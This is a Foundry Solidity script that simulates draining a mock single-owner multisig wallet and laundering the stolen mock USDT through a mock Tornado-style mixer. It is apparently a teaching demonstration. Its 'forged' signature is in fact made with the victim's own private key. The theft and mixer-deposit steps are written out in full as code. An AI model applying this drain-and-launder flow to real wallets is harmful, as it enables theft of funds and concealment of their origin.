// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/MockUSDT.sol";
import "../src/SimpleMultiSig.sol";
import "../src/MockTornado.sol";

contract ExploitScript is Script {
    MockUSDT usdt;
    SimpleMultiSig wallet;
    MockTornado tornado;

    uint256 attackerPrivateKey = 0xBADA55; 
    address attacker = vm.addr(attackerPrivateKey);

    function run() public {
        // Victim
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("Deployer (Victim):", deployer);
        console.log("Attacker:", attacker);

        // ====================================================
        // 1. 環境部署 (Setup)
        // ====================================================
        vm.startBroadcast(deployerPrivateKey); 
        
        // A. 部署合約
        usdt = new MockUSDT();
        address[] memory owners = new address[](1);
        owners[0] = deployer;
        wallet = new SimpleMultiSig(owners, 1);
        tornado = new MockTornado(address(usdt), 1000 ether);

        // B. 資金進場
        usdt.mint(address(wallet), 1_000_000 ether);

        vm.stopBroadcast();
        
        console.log("--------------------------------------------------");
        console.log("[Setup] Victim MultiSig USDT:", usdt.balanceOf(address(wallet)) / 1e18);
        console.log("[Setup] Attacker ETH Balance:", attacker.balance / 1e18);
        console.log("--------------------------------------------------");


        // ====================================================
        // 2. 攻擊階段 (The Hack)
        // ====================================================
        
        // A. 構造 Payload
        bytes memory payload = abi.encodeWithSelector(
            ERC20.transfer.selector, 
            attacker, 
            1_000_000 ether
        );

        // B. 計算 Hash (利用鏈上狀態)
        bytes32 txHash = wallet.getTransactionHash(
            address(usdt), 
            0, 
            payload, 
            wallet.nonce()
        );

        // C. 偽造簽名 
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", txHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPrivateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // D. 執行攻擊 
        vm.startBroadcast(attackerPrivateKey); 
        wallet.execTransaction(address(usdt), 0, payload, signature);
        vm.stopBroadcast();

        console.log("[Hack]  Attack Executed!");
        console.log("[Hack]  Attacker USDT Now   :", usdt.balanceOf(attacker) / 1e18);


        // ====================================================
        // 3. 混幣階段 (The Laundering)
        // ====================================================
        vm.startBroadcast(attackerPrivateKey);

        // A. Commitment
        bytes32 secret = keccak256(abi.encodePacked("MySecret123")); 
        bytes32 nullifier = keccak256(abi.encodePacked("NullifierXYZ"));
        bytes32 commitment = keccak256(abi.encodePacked(secret, nullifier));

        // B. Approve & Deposit
        usdt.approve(address(tornado), 1_000_000 ether);
        
        tornado.deposit(commitment);

        vm.stopBroadcast();

        console.log("--------------------------------------------------");
        console.log("[End]   Attacker USDT Left  :", usdt.balanceOf(attacker) / 1e18);
        console.log("[End]   Tornado USDT Balance:", usdt.balanceOf(address(tornado)) / 1e18);
        console.log("--------------------------------------------------");
    }
}